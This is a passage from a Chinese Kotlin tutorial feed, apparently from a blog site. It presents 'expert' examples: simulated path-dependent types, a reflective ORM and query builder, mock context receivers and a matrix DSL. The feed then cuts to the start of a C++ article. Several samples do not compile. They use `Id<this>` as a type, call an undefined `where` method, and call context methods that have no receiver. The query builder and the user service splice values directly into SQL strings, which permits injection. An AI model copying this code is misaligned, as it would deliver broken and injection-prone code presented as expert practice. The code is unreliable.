<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// 模拟路径依赖类型的概念</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">PathDependentTypeSimulation</span> {
    
    <span class="hljs-keyword">class</span> <span class="hljs-title class_">Database</span> {
        <span class="hljs-keyword">class</span> <span class="hljs-title class_">Table</span>(<span class="hljs-keyword">val</span> name: String) {
            <span class="hljs-keyword">inner</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Row</span>(<span class="hljs-keyword">val</span> <span class="hljs-keyword">data</span>: Map&lt;String, Any&gt;) {
                <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">getValue</span><span class="hljs-params">(column: <span class="hljs-type">String</span>)</span></span>: Any? = <span class="hljs-keyword">data</span>[column]
            }
            
            <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">createRow</span><span class="hljs-params">(<span class="hljs-keyword">data</span>: <span class="hljs-type">Map</span>&lt;<span class="hljs-type">String</span>, Any&gt;)</span></span>: Row = Row(<span class="hljs-keyword">data</span>)
        }
        
        <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">createTable</span><span class="hljs-params">(name: <span class="hljs-type">String</span>)</span></span>: Table = Table(name)
    }
    
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">demonstratePathDependentTypes</span><span class="hljs-params">()</span></span> {
        <span class="hljs-keyword">val</span> db = Database()
        <span class="hljs-keyword">val</span> usersTable = db.createTable(<span class="hljs-string">"users"</span>)
        <span class="hljs-keyword">val</span> productsTable = db.createTable(<span class="hljs-string">"products"</span>)
        
        <span class="hljs-comment">// 这些行类型是路径依赖的</span>
        <span class="hljs-keyword">val</span> userRow: Database.Table.Row = usersTable.createRow(mapOf(<span class="hljs-string">"name"</span> to <span class="hljs-string">"Alice"</span>))
        <span class="hljs-keyword">val</span> productRow: Database.Table.Row = productsTable.createRow(mapOf(<span class="hljs-string">"price"</span> to <span class="hljs-number">100</span>))
        
        <span class="hljs-comment">// 类型系统知道这些行属于不同的表</span>
        println(<span class="hljs-string">"用户行: <span class="hljs-subst">${userRow.getValue(<span class="hljs-string">"name"</span>)}</span>"</span>)
        println(<span class="hljs-string">"产品行: <span class="hljs-subst">${productRow.getValue(<span class="hljs-string">"price"</span>)}</span>"</span>)
        
        <span class="hljs-comment">// 编译错误：不能将用户行赋值给产品行变量</span>
        <span class="hljs-comment">// val wrongAssignment: productsTable.Row = userRow // 编译错误！</span>
    }
}

<span class="hljs-comment">// 更复杂的路径依赖类型模拟</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">AdvancedPathDependentTypes</span> {
    
    <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Entity</span> {
        <span class="hljs-keyword">val</span> id: Id&lt;<span class="hljs-keyword">this</span>&gt;
    }
    
    <span class="hljs-keyword">data</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Id</span>&lt;<span class="hljs-type">out E : Entity</span>&gt;(<span class="hljs-keyword">val</span> value: String)
    
    <span class="hljs-keyword">data</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span>(<span class="hljs-keyword">override</span> <span class="hljs-keyword">val</span> id: Id&lt;User&gt;, <span class="hljs-keyword">val</span> name: String) : Entity
    <span class="hljs-keyword">data</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Product</span>(<span class="hljs-keyword">override</span> <span class="hljs-keyword">val</span> id: Id&lt;Product&gt;, <span class="hljs-keyword">val</span> title: String) : Entity
    
    <span class="hljs-keyword">class</span> <span class="hljs-title class_">Repository</span>&lt;<span class="hljs-type">E : Entity</span>&gt; {
        <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> storage = mutableMapOf&lt;Id&lt;E&gt;, E&gt;()
        
        <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">save</span><span class="hljs-params">(entity: <span class="hljs-type">E</span>)</span></span> {
            storage[entity.id] = entity
        }
        
        <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">findById</span><span class="hljs-params">(id: <span class="hljs-type">Id</span>&lt;<span class="hljs-type">E</span>&gt;)</span></span>: E? = storage[id]
    }
    
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">demonstrateTypeSafeIds</span><span class="hljs-params">()</span></span> {
        <span class="hljs-keyword">val</span> userRepo = Repository&lt;User&gt;()
        <span class="hljs-keyword">val</span> productRepo = Repository&lt;Product&gt;()
        
        <span class="hljs-keyword">val</span> userId = Id&lt;User&gt;(<span class="hljs-string">"user-123"</span>)
        <span class="hljs-keyword">val</span> productId = Id&lt;Product&gt;(<span class="hljs-string">"product-456"</span>)
        
        <span class="hljs-keyword">val</span> user = User(userId, <span class="hljs-string">"Alice"</span>)
        <span class="hljs-keyword">val</span> product = Product(productId, <span class="hljs-string">"Laptop"</span>)
        
        userRepo.save(user)
        productRepo.save(product)
        
        <span class="hljs-comment">// 类型安全：不能使用用户ID查询产品</span>
        <span class="hljs-keyword">val</span> foundUser = userRepo.findById(userId)
        <span class="hljs-comment">// val wrongQuery = productRepo.findById(userId) // 编译错误！</span>
        
        println(<span class="hljs-string">"找到的用户: <span class="hljs-variable">$foundUser</span>"</span>)
    }
}
</code></pre>
<h4 data-id="heading-10"><strong>四十九、Kotlin 元对象协议（MOP）高级应用</strong></h4>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">import</span> kotlin.reflect.KClass
<span class="hljs-keyword">import</span> kotlin.reflect.KProperty
<span class="hljs-keyword">import</span> kotlin.reflect.full.*

<span class="hljs-comment">// 高级属性委托：实现 ORM 映射</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">EntityMapping</span>&lt;<span class="hljs-type">T : Any</span>&gt;(<span class="hljs-keyword">val</span> kClass: KClass&lt;T&gt;) {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> tableName = kClass.simpleName ?: <span class="hljs-string">"unknown_table"</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> columns = mutableMapOf&lt;String, ColumnMapping&lt;*&gt;&gt;()
    
    <span class="hljs-keyword">inner</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ColumnMapping</span>&lt;<span class="hljs-type">T</span>&gt;(<span class="hljs-keyword">val</span> name: String, <span class="hljs-keyword">val</span> type: KClass&lt;T&gt;) {
        <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">toSQL</span><span class="hljs-params">()</span></span>: String = <span class="hljs-string">"<span class="hljs-variable">$name</span> <span class="hljs-subst">${typeToSQL(type)}</span>"</span>
    }
    
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-type">&lt;T&gt;</span> <span class="hljs-title">column</span><span class="hljs-params">(name: <span class="hljs-type">String</span>, type: <span class="hljs-type">KClass</span>&lt;<span class="hljs-type">T</span>&gt;)</span></span>: ColumnMapping&lt;T&gt; {
        <span class="hljs-keyword">val</span> mapping = ColumnMapping(name, type)
        columns[name] = mapping
        <span class="hljs-keyword">return</span> mapping
    }
    
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">createTableSQL</span><span class="hljs-params">()</span></span>: String {
        <span class="hljs-keyword">val</span> columnDefs = columns.values.joinToString(<span class="hljs-string">",\n  "</span>) { it.toSQL() }
        <span class="hljs-keyword">return</span> <span class="hljs-string">"""
            CREATE TABLE <span class="hljs-variable">$tableName</span> (
              id INTEGER PRIMARY KEY,
              <span class="hljs-variable">$columnDefs</span>
            )
        """</span>.trimIndent()
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">typeToSQL</span><span class="hljs-params">(type: <span class="hljs-type">KClass</span>&lt;*&gt;)</span></span>: String = <span class="hljs-keyword">when</span> (type) {
        String::<span class="hljs-keyword">class</span> -&gt; <span class="hljs-string">"TEXT"</span>
        <span class="hljs-built_in">Int</span>::<span class="hljs-keyword">class</span> -&gt; <span class="hljs-string">"INTEGER"</span>
        <span class="hljs-built_in">Double</span>::<span class="hljs-keyword">class</span> -&gt; <span class="hljs-string">"REAL"</span>
        <span class="hljs-built_in">Boolean</span>::<span class="hljs-keyword">class</span> -&gt; <span class="hljs-string">"BOOLEAN"</span>
        <span class="hljs-keyword">else</span> -&gt; <span class="hljs-string">"TEXT"</span>
    }
}

<span class="hljs-comment">// 基于反射的查询构建器</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">ReflectiveQueryBuilder</span>&lt;<span class="hljs-type">T : Any</span>&gt;(<span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> kClass: KClass&lt;T&gt;) {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> whereClause: String? = <span class="hljs-literal">null</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> limit: <span class="hljs-built_in">Int</span>? = <span class="hljs-literal">null</span>
    
    <span class="hljs-keyword">infix</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-type">&lt;V&gt;</span> KProperty<span class="hljs-type">&lt;T&gt;</span>.<span class="hljs-title">eq</span><span class="hljs-params">(value: <span class="hljs-type">V</span>)</span></span>: ReflectiveQueryBuilder&lt;T&gt; {
        whereClause = <span class="hljs-string">"<span class="hljs-subst">${this.name}</span> = '<span class="hljs-subst">${value}</span>'"</span>
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span><span class="hljs-symbol">@ReflectiveQueryBuilder</span>
    }
    
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">limit</span><span class="hljs-params">(count: <span class="hljs-type">Int</span>)</span></span>: ReflectiveQueryBuilder&lt;T&gt; {
        limit = count
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>
    }
    
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">buildSelect</span><span class="hljs-params">()</span></span>: String {
        <span class="hljs-keyword">val</span> tableName = kClass.simpleName ?: <span class="hljs-string">"unknown"</span>
        <span class="hljs-keyword">val</span> <span class="hljs-keyword">where</span> = whereClause?.let { <span class="hljs-string">"WHERE <span class="hljs-variable">$it</span>"</span> } ?: <span class="hljs-string">""</span>
        <span class="hljs-keyword">val</span> limitClause = limit?.let { <span class="hljs-string">"LIMIT <span class="hljs-variable">$it</span>"</span> } ?: <span class="hljs-string">""</span>
        
        <span class="hljs-keyword">return</span> <span class="hljs-string">"SELECT * FROM <span class="hljs-variable">$tableName</span> <span class="hljs-variable">$where</span> <span class="hljs-variable">$limitClause</span>"</span>.trim()
    }
}

<span class="hljs-comment">// 使用高级 MOP</span>
<span class="hljs-keyword">data</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span>(<span class="hljs-keyword">val</span> id: <span class="hljs-built_in">Int</span>, <span class="hljs-keyword">val</span> name: String, <span class="hljs-keyword">val</span> email: String, <span class="hljs-keyword">val</span> age: <span class="hljs-built_in">Int</span>)

<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">testAdvancedMOP</span><span class="hljs-params">()</span></span> {
    <span class="hljs-comment">// 1. 实体映射</span>
    <span class="hljs-keyword">val</span> userMapping = EntityMapping(User::<span class="hljs-keyword">class</span>)
    userMapping.column(<span class="hljs-string">"name"</span>, String::<span class="hljs-keyword">class</span>)
    userMapping.column(<span class="hljs-string">"email"</span>, String::<span class="hljs-keyword">class</span>)
    userMapping.column(<span class="hljs-string">"age"</span>, <span class="hljs-built_in">Int</span>::<span class="hljs-keyword">class</span>)
    
    println(<span class="hljs-string">"创建表 SQL:"</span>)
    println(userMapping.createTableSQL())
    
    <span class="hljs-comment">// 2. 反射查询构建</span>
    <span class="hljs-keyword">val</span> query = ReflectiveQueryBuilder(User::<span class="hljs-keyword">class</span>)
        .<span class="hljs-keyword">where</span>(User::name eq <span class="hljs-string">"Alice"</span>)
        .<span class="hljs-keyword">where</span>(User::age eq <span class="hljs-number">25</span>)
        .limit(<span class="hljs-number">10</span>)
        .buildSelect()
    
    println(<span class="hljs-string">"\n生成的查询:"</span>)
    println(query)
    
    <span class="hljs-comment">// 3. 运行时类型检查与转换</span>
    <span class="hljs-keyword">val</span> users = listOf(
        User(<span class="hljs-number">1</span>, <span class="hljs-string">"Alice"</span>, <span class="hljs-string">"alice@example.com"</span>, <span class="hljs-number">25</span>),
        User(<span class="hljs-number">2</span>, <span class="hljs-string">"Bob"</span>, <span class="hljs-string">"bob@example.com"</span>, <span class="hljs-number">30</span>)
    )
    
    <span class="hljs-keyword">val</span> filtered = users.filterByType&lt;User&gt; { it.age &gt; <span class="hljs-number">25</span> }
    println(<span class="hljs-string">"\n过滤后的用户: <span class="hljs-variable">$filtered</span>"</span>)
}

<span class="hljs-comment">// 类型安全的过滤扩展</span>
<span class="hljs-keyword">inline</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-type">&lt;<span class="hljs-keyword">reified</span> T&gt;</span> List<span class="hljs-type">&lt;Any&gt;</span>.<span class="hljs-title">filterByType</span><span class="hljs-params">(<span class="hljs-keyword">noinline</span> predicate: (<span class="hljs-type">T</span>) -&gt; <span class="hljs-type">Boolean</span>)</span></span>: List&lt;T&gt; {
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>.filterIsInstance&lt;T&gt;().filter(predicate)
}
</code></pre>
<h4 data-id="heading-11"><strong>五十、Kotlin 未来与实验性特性展望</strong></h4>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// 1. 上下文接收器的未来版本模拟</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">ContextReceiversFuture</span> {
    
    <span class="hljs-comment">// 模拟未来的上下文接收器语法</span>
    <span class="hljs-keyword">interface</span> <span class="hljs-title class_">DatabaseContext</span> {
        <span class="hljs-keyword">val</span> connection: DatabaseConnection
        <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">executeQuery</span><span class="hljs-params">(sql: <span class="hljs-type">String</span>)</span></span>: String = connection.execute(sql)
    }
    
    <span class="hljs-keyword">interface</span> <span class="hljs-title class_">LoggingContext</span> {
        <span class="hljs-keyword">val</span> logger: Logger
        <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">log</span><span class="hljs-params">(message: <span class="hljs-type">String</span>)</span></span> = logger.info(message)
    }
    
    <span class="hljs-keyword">class</span> <span class="hljs-title class_">FutureUserService</span> {
        <span class="hljs-comment">// 模拟：context(DatabaseContext, LoggingContext)</span>
        <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">getUser</span><span class="hljs-params">(id: <span class="hljs-type">Int</span>)</span></span>: String {
            <span class="hljs-comment">// 模拟：可以访问上下文中的方法</span>
            log(<span class="hljs-string">"查询用户 <span class="hljs-variable">$id</span>"</span>)
            <span class="hljs-keyword">return</span> executeQuery(<span class="hljs-string">"SELECT * FROM users WHERE id = <span class="hljs-variable">$id</span>"</span>)
        }
    }
    
    <span class="hljs-comment">// 当前可用的替代方案</span>
    <span class="hljs-keyword">class</span> <span class="hljs-title class_">CurrentUserService</span>(
        <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> dbContext: DatabaseContext,
        <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> logContext: LoggingContext
    ) {
        <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">getUser</span><span class="hljs-params">(id: <span class="hljs-type">Int</span>)</span></span>: String {
            logContext.log(<span class="hljs-string">"查询用户 <span class="hljs-variable">$id</span>"</span>)
            <span class="hljs-keyword">return</span> dbContext.executeQuery(<span class="hljs-string">"SELECT * FROM users WHERE id = <span class="hljs-variable">$id</span>"</span>)
        }
    }
}

<span class="hljs-comment">// 2. 多态内联函数的未来增强</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">PolymorphicInlineFuture</span> {
    
    <span class="hljs-comment">// 模拟未来的多态内联函数</span>
    <span class="hljs-keyword">inline</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-type">&lt;<span class="hljs-keyword">reified</span> T&gt;</span> T?.<span class="hljs-title">validate</span><span class="hljs-params">(<span class="hljs-keyword">vararg</span> validators: (<span class="hljs-type">T</span>) -&gt; <span class="hljs-type">Boolean</span>)</span></span>: <span class="hljs-built_in">Boolean</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">if</span> (<span class="hljs-keyword">this</span> != <span class="hljs-literal">null</span>) {
            validators.all { it(<span class="hljs-keyword">this</span>) }
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-literal">false</span>
        }
    }
    
    <span class="hljs-comment">// 当前可用的复杂版本</span>
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-type">&lt;T&gt;</span> T?.<span class="hljs-title">validateCurrent</span><span class="hljs-params">(validators: <span class="hljs-type">List</span>&lt;(<span class="hljs-type">T</span>) -&gt; <span class="hljs-type">Boolean</span>&gt;)</span></span>: <span class="hljs-built_in">Boolean</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">if</span> (<span class="hljs-keyword">this</span> != <span class="hljs-literal">null</span>) {
            validators.all { it(<span class="hljs-keyword">this</span>) }
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-literal">false</span>
        }
    }
}

<span class="hljs-comment">// 3. 自定义操作符的深度应用</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">CustomOperatorsDeepDive</span> {
    
    <span class="hljs-comment">// 矩阵运算 DSL</span>
    <span class="hljs-keyword">class</span> <span class="hljs-title class_">Matrix</span>(<span class="hljs-keyword">val</span> rows: <span class="hljs-built_in">Int</span>, <span class="hljs-keyword">val</span> cols: <span class="hljs-built_in">Int</span>, <span class="hljs-keyword">init</span>: (<span class="hljs-built_in">Int</span>, <span class="hljs-built_in">Int</span>) -&gt; <span class="hljs-built_in">Double</span> = { _, _ -&gt; <span class="hljs-number">0.0</span> }) {
        <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> <span class="hljs-keyword">data</span> = Array(rows) { i -&gt; DoubleArray(cols) { j -&gt; <span class="hljs-keyword">init</span>(i, j) } }
        
        <span class="hljs-keyword">operator</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">get</span><span class="hljs-params">(i: <span class="hljs-type">Int</span>, j: <span class="hljs-type">Int</span>)</span></span>: <span class="hljs-built_in">Double</span> = <span class="hljs-keyword">data</span>[i][j]
        <span class="hljs-keyword">operator</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">set</span><span class="hljs-params">(i: <span class="hljs-type">Int</span>, j: <span class="hljs-type">Int</span>, value: <span class="hljs-type">Double</span>)</span></span> { <span class="hljs-keyword">data</span>[i][j] = value }
        
        <span class="hljs-keyword">operator</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">plus</span><span class="hljs-params">(other: <span class="hljs-type">Matrix</span>)</span></span>: Matrix {
            require(rows == other.rows &amp;&amp; cols == other.cols)
            <span class="hljs-keyword">return</span> Matrix(rows, cols) { i, j -&gt; <span class="hljs-keyword">this</span>[i, j] + other[i, j] }
        }
        
        <span class="hljs-keyword">operator</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">times</span><span class="hljs-params">(other: <span class="hljs-type">Matrix</span>)</span></span>: Matrix {
            require(cols == other.rows)
            <span class="hljs-keyword">return</span> Matrix(rows, other.cols) { i, j -&gt;
                (<span class="hljs-number">0</span> until cols).sumOf { k -&gt; <span class="hljs-keyword">this</span>[i, k] * other[k, j] }
            }
        }
        
        <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">toString</span><span class="hljs-params">()</span></span>: String {
            <span class="hljs-keyword">return</span> <span class="hljs-keyword">data</span>.joinToString(<span class="hljs-string">"\n"</span>) { row -&gt; row.joinToString(<span class="hljs-string">" "</span>) }
        }
    }
    
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">demonstrateMatrixOperations</span><span class="hljs-params">()</span></span> {
        <span class="hljs-keyword">val</span> a = Matrix(<span class="hljs-number">2</span>, <span class="hljs-number">2</span>) { i, j -&gt; (i * <span class="hljs-number">2</span> + j + <span class="hljs-number">1</span>).toDouble() }
        <span class="hljs-keyword">val</span> b = Matrix(<span class="hljs-number">2</span>, <span class="hljs-number">2</span>) { i, j -&gt; (i + j * <span class="hljs-number">2</span> + <span class="hljs-number">1</span>).toDouble() }
        
        println(<span class="hljs-string">"矩阵 A:\n<span class="hljs-variable">$a</span>"</span>)
        println(<span class="hljs-string">"矩阵 B:\n<span class="hljs-variable">$b</span>"</span>)
        println(<span class="hljs-string">"A + B:\n<span class="hljs-subst">${a + b}</span>"</span>)
        println(<span class="hljs-string">"A × B:\n<span class="hljs-subst">${a * b}</span>"</span>)
    }
}

<span class="hljs-comment">// 测试所有高级特性</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {
    println(<span class="hljs-string">"=== 编译器原理演示 ==="</span>)
    testCompilerPhases()
    
    println(<span class="hljs-string">"\n=== 语言设计哲学演示 ==="</span>)
    FunctionalOOFusion().demonstrateImmutability()
    
    println(<span class="hljs-string">"\n=== 高级类型系统演示 ==="</span>)
    HigherKindedSimulation().demonstrateSimulatedHKT()
    
    println(<span class="hljs-string">"\n=== 路径依赖类型演示 ==="</span>)
    PathDependentTypeSimulation().demonstratePathDependentTypes()
    AdvancedPathDependentTypes().demonstrateTypeSafeIds()
    
    println(<span class="hljs-string">"\n=== 元对象协议演示 ==="</span>)
    testAdvancedMOP()
    
    println(<span class="hljs-string">"\n=== 自定义操作符演示 ==="</span>)
    CustomOperatorsDeepDive().demonstrateMatrixOperations()
}
</code></pre>
<h4 data-id="heading-12"><strong>成为 Kotlin 语言专家的路径</strong></h4>
<p>你现在已经达到了 Kotlin 的专家级别！接下来可以：</p>
<ol>
<li><strong>研究 Kotlin 编译器源码</strong>：理解每个编译阶段的实现</li>
<li><strong>参与 Kotlin 语言规范制定</strong>：贡献语言设计讨论</li>
<li><strong>开发高级编译器插件</strong>：创建领域特定语言扩展</li>
<li><strong>研究 Kotlin 类型系统形式化</strong>：用数学方法证明类型安全</li>
<li><strong>探索 Kotlin 多平台前沿</strong>：研究新的目标平台支持</li>
<li><strong>贡献 Kotlin 生态系统</strong>：创建重要的库和框架</li>
</ol>
<p>你已经从 Kotlin 使用者成长为可以影响语言发展的专家！继续深入探索，推动 Kotlin 语言的发展边界。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[【C++必知必会】读取文件速记]]></title>    <link>https://juejin.cn/post/7576018857368600619</link>    <guid>https://juejin.cn/post/7576018857368600619</guid>    <pubDate>2025-11-24T11:06:25.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7576018857368600619" data-draft-id="7576098886860144683" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="【C++必知必会】读取文件速记"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2025-11-24T11:06:25.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="码事漫谈"/> <meta itemprop="url" content="https://juejin.cn/user/1972974802965230"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            【C++必知必会】读取文件速记
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1972974802965230/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    码事漫谈
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T11:06:25.000Z" title="Mon Nov 24 2025 11:06:25 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读2分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class 